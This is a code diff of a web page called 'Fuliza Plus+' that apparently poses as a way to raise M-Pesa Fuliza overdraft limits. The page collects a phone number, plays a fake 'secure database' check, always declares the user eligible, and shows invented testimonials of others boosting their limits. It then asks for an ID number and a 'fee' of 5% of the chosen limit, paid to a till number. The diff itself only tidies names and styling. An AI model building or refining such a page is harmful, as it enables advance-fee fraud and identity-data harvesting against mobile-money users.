@@ -12,46 +12,50 @@ body{
   background:linear-gradient(to bottom,#eef2f7,#fff);
 }
 
+/* HIDE */
 .hidden{display:none}
 
-.center-screen{
+/* CENTER */
+.center{
   display:flex;
   justify-content:center;
   align-items:center;
   height:100vh;
 }
 
+/* CARD */
 .card{
-  background:#fff;
   width:90%;
   max-width:350px;
-  padding:30px;
+  background:#fff;
+  padding:25px;
   border-radius:25px;
   text-align:center;
-  box-shadow:0 10px 30px rgba(0,0,0,0.1);
+  box-shadow:0 10px 25px rgba(0,0,0,0.1);
 }
 
-button{
+/* INPUT */
+.input{
   width:100%;
   padding:14px;
-  border:none;
   border-radius:12px;
+  border:1px solid #ddd;
+  margin:15px 0;
   font-size:16px;
 }
 
-.input{
+/* BUTTON */
+.btn{
   width:100%;
-  padding:12px;
-  border-radius:10px;
-  border:1px solid #ddd;
-  margin:15px 0;
-}
-
-.green-btn{
+  padding:14px;
+  border:none;
+  border-radius:14px;
   background:#22c55e;
   color:#fff;
+  font-size:16px;
 }
 
+/* LOADING */
 .spinner{
   width:60px;
   height:60px;
@@ -61,27 +65,24 @@ button{
   margin:0 auto 20px;
   animation:spin 1s linear infinite;
 }
+@keyframes spin{100%{transform:rotate(360deg)}}
 
-@keyframes spin{
-  100%{transform:rotate(360deg)}
-}
-
+/* SUCCESS */
 .check{
   width:80px;
   height:80px;
   background:#22c55e;
-  color:#fff;
   border-radius:50%;
+  color:#fff;
+  font-size:30px;
   display:flex;
   align-items:center;
   justify-content:center;
-  font-size:30px;
   margin:0 auto 20px;
 }
 
-.container{
-  padding:20px;
-}
+/* LIMITS */
+.container{padding:20px}
 
 .grid{
   display:grid;
@@ -106,8 +107,8 @@ button{
   background:#e6f4ea;
   padding:10px;
   border-radius:10px;
-  margin-bottom:10px;
   font-size:13px;
+  margin-bottom:10px;
 }
 
 #upgradeBtn{
@@ -116,11 +117,9 @@ button{
   color:#fff;
   opacity:0.5;
 }
+#upgradeBtn.active{opacity:1}
 
-#upgradeBtn.active{
-  opacity:1;
-}
-
+/* MODAL */
 .modal{
   position:fixed;
   top:0;
@@ -129,8 +128,8 @@ button{
   height:100%;
   background:rgba(0,0,0,0.4);
   display:flex;
-  align-items:center;
   justify-content:center;
+  align-items:center;
 }
 
 .modal-card{
@@ -147,15 +146,12 @@ button{
   padding:20px;
 }
 
-.modal-body{
-  padding:20px;
-}
+.modal-body{padding:20px}
 
 .info{
   background:#e6f4ea;
   padding:10px;
   border-radius:10px;
-  font-size:13px;
   margin-bottom:10px;
 }
 
@@ -164,85 +160,74 @@ button{
   gap:10px;
 }
 
-.cancel{
-  background:#eee;
-}
+.cancel{background:#eee}
+.pay{background:#22c55e;color:#fff}
 
-.pay{
-  background:#22c55e;
-  color:#fff;
-}
 </style>
 </head>
 
 <body>
 
 <!-- STEP 1 -->
-<div id="step1" class="center-screen">
+<div id="step1" class="center">
   <div class="card">
     <h2>Fuliza Plus+</h2>
     <p>Verify your identity to unlock higher limits</p>
 
     <input id="phone" class="input" placeholder="Enter M-Pesa Number">
 
-    <button class="green-btn" onclick="startProcess()">Check My Eligibility</button>
+    <button class="btn" onclick="start()">Check My Eligibility</button>
   </div>
 </div>
 
-<!-- STEP 2 -->
-<div id="step2" class="center-screen hidden">
+<!-- STEP 2-5 -->
+<div id="step2" class="center hidden">
   <div class="card">
     <div class="spinner"></div>
-    <h2 id="loadingText">Connecting...</h2>
-    <p id="subText">Accessing secure databases...</p>
+    <h3 id="loadingText">Connecting...</h3>
+    <p>Accessing secure databases...</p>
   </div>
 </div>
 
-<!-- STEP 3 -->
-<div id="step3" class="center-screen hidden">
+<!-- STEP 6 -->
+<div id="step6" class="center hidden">
   <div class="card">
     <div class="check">✔</div>
     <h2>Congratulations!</h2>
-    <p>High Trust Score Detected. <b id="userNumber"></b></p>
+    <p id="userNumber"></p>
 
-    <button class="green-btn" onclick="showLimits()">
+    <button class="btn" onclick="showLimits()">
       Proceed to Upgrade Limit
     </button>
   </div>
 </div>
 
-<!-- LIMITS -->
+<!-- STEP 7 -->
 <div id="limits" class="container hidden">
 
-  <div id="liveActivity" class="live"></div>
+  <div id="live" class="live"></div>
 
   <h3>Select Your New Approved Limit</h3>
 
   <div class="grid">
-    <div class="box" data-amount="3000">Ksh 3,000</div>
-    <div class="box" data-amount="5000">Ksh 5,000</div>
-    <div class="box" data-amount="7500">Ksh 7,500</div>
-    <div class="box" data-amount="10000">Ksh 10,000</div>
-    <div class="box" data-amount="12500">Ksh 12,500</div>
-    <div class="box" data-amount="16000">Ksh 16,000</div>
-    <div class="box" data-amount="21000">Ksh 21,000</div>
-    <div class="box" data-amount="25500">Ksh 25,500</div>
-    <div class="box" data-amount="30000">Ksh 30,000</div>
-    <div class="box" data-amount="35000">Ksh 35,000</div>
-    <div class="box" data-amount="45000">Ksh 45,000</div>
-    <div class="box" data-amount="60000">Ksh 60,000</div>
-    <div class="box" data-amount="70000">Ksh 70,000</div>
+    <div class="box" data="3000">Ksh 3,000</div>
+    <div class="box" data="5000">Ksh 5,000</div>
+    <div class="box" data="7500">Ksh 7,500</div>
+    <div class="box" data="10000">Ksh 10,000</div>
+    <div class="box" data="21000">Ksh 21,000</div>
+    <div class="box" data="30000">Ksh 30,000</div>
+    <div class="box" data="45000">Ksh 45,000</div>
+    <div class="box" data="60000">Ksh 60,000</div>
+    <div class="box" data="70000">Ksh 70,000</div>
   </div>
 
-  <button id="upgradeBtn" onclick="upgrade()" disabled>
+  <button id="upgradeBtn" disabled onclick="openModal()">
     ⚡ UPGRADE
   </button>
-
 </div>
 
-<!-- MODAL -->
+<!-- STEP 8 MODAL -->
 <div id="modal" class="modal hidden">
-
   <div class="modal-card">
 
     <div class="modal-header">
@@ -253,7 +238,7 @@ button{
     <div class="modal-body">
 
       <div class="info">
-        Pay to Till Number <b>6363781</b> to proceed.
+        Pay to Till Number <b>6363781</b>
       </div>
 
       <input class="input" placeholder="ID Number">
@@ -265,17 +250,15 @@ button{
       </div>
 
     </div>
-
   </div>
-
 </div>
 
 <script>
 
 /* STEP FLOW */
-function startProcess(){
+function start(){
   let phone=document.getElementById("phone").value;
-  if(!phone) return alert("Enter phone");
+  if(!phone) return alert("Enter number");
 
   document.getElementById("step1").classList.add("hidden");
   document.getElementById("step2").classList.remove("hidden");
@@ -295,66 +278,63 @@ function startProcess(){
 
     if(i===steps.length){
       clearInterval(interval);
-
       setTimeout(()=>{
         document.getElementById("step2").classList.add("hidden");
-        document.getElementById("step3").classList.remove("hidden");
-        document.getElementById("userNumber").innerText=phone;
+        document.getElementById("step6").classList.remove("hidden");
+        document.getElementById("userNumber").innerText=phone+" is eligible";
       },1000);
     }
   },2000);
 }
 
+/* LIMIT SCREEN */
 function showLimits(){
-  document.getElementById("step3").classList.add("hidden");
+  document.getElementById("step6").classList.add("hidden");
   document.getElementById("limits").classList.remove("hidden");
 }
 
 /* LIVE ACTIVITY */
-let activities=[
+let msgs=[
  "Brian boosted to Ksh 21,000",
  "Mercy boosted to Ksh 10,000",
  "Kevin boosted to Ksh 45,000"
 ];
-
-let index=0;
+let i=0;
 
 setInterval(()=>{
-  document.getElementById("liveActivity").innerText=activities[index];
-  index=(index+1)%activities.length;
+  document.getElementById("live").innerText=msgs[i];
+  i=(i+1)%msgs.length;
 },2500);
 
 /* SELECT */
-let selectedAmount="";
-let boxes=document.querySelectorAll(".box");
+let selected=0;
 
-boxes.forEach(box=>{
-  box.onclick=()=>{
-    boxes.forEach(b=>b.classList.remove("active"));
-    box.classList.add("active");
+document.querySelectorAll(".box").forEach(b=>{
+  b.onclick=()=>{
+    document.querySelectorAll(".box").forEach(x=>x.classList.remove("active"));
+    b.classList.add("active");
 
-    selectedAmount=box.dataset.amount;
+    selected=b.getAttribute("data");
 
     let btn=document.getElementById("upgradeBtn");
     btn.disabled=false;
     btn.classList.add("active");
-
-    btn.innerText="⚡ UPGRADE TO KSH "+Number(selectedAmount).toLocaleString();
+    btn.innerText="⚡ UPGRADE TO KSH "+Number(selected).toLocaleString();
   }
 });
 
 /* MODAL */
-function upgrade(){
+function openModal(){
+  document.getElementById("modal").classList.remove("hidden");
+
   document.getElementById("modalTitle").innerText=
-   "Limit will be boosted to Ksh "+Number(selectedAmount).toLocaleString();
+   "Limit will be boosted to Ksh "+Number(selected).toLocaleString();
 
   document.getElementById("payBtn").innerText=
-   "Pay Ksh "+Math.floor(selectedAmount*0.05);
+   "Pay Ksh "+Math.floor(selected*0.05);
 
   document.getElementById("modalPhone").value=
    document.getElementById("phone").value;
-
-  document.getElementById("modal").classList.remove("hidden");
 }
 
 function closeModal(){
